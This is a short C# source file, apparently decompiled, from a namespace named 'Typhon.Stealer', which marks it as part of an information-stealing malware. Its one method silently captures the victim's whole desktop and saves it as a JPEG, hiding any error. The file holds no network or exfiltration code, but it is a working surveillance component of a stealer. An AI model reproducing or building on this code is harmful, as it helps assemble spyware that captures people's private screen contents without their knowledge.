using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;

namespace Typhon.Stealer.SystemInfo
{
	// Token: 0x0200000A RID: 10
	internal class SaveScreenshot
	{
		// Token: 0x06000028 RID: 40 RVA: 0x000034F8 File Offset: 0x000016F8
		public static bool GrabDesktop(string sSavePath, int mode = 0)
		{
			bool result;
			try
			{
				Rectangle bounds = Screen.GetBounds(Point.Empty);
				using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
				{
					using (Graphics graphics = Graphics.FromImage(bitmap))
					{
						graphics.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
					}
					bitmap.Save(Path.Combine(sSavePath, (mode == 0) ? "Screenshot.jpg" : ("Screenshot" + DateTime.Now.ToString("_dd.MM.yyyy_HH.mm.ss") + ".jpeg")), ImageFormat.Jpeg);
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}
	}
}
